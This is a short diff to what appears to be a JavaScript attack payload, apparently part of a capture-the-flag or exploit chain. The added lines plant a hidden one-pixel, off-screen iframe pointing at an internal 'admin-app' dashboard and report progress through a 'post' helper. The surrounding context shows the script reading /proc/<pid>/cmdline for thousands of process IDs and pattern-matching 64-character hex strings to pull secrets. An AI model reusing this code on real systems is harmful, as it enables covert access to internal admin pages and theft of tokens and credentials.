@@ -57,7 +57,14 @@ const tryChunk=d=>{
  m=m.concat((low.match(/(?:[a-f0-9]\.){63}[a-f0-9]/g)||[]).map(x=>x.replace(/\./g,'')));
  return m.find(x=>!/^0+$/.test(x))||'';
 };
+const sleep=ms=>new Promise(r=>setTimeout(r,ms));
 post('stage start');
+let fr=document.createElement('iframe');
+fr.src='http://admin-app/dashboard/home';
+fr.style='width:1px;height:1px;position:fixed;left:-9px;top:-9px';
+document.body.appendChild(fr);
+post('admin iframe');
+await sleep(5000);
 let pc=0;
 for(let pid=1;pid<5000;pid++){
  let c=await rt('/proc/'+pid+'/cmdline');
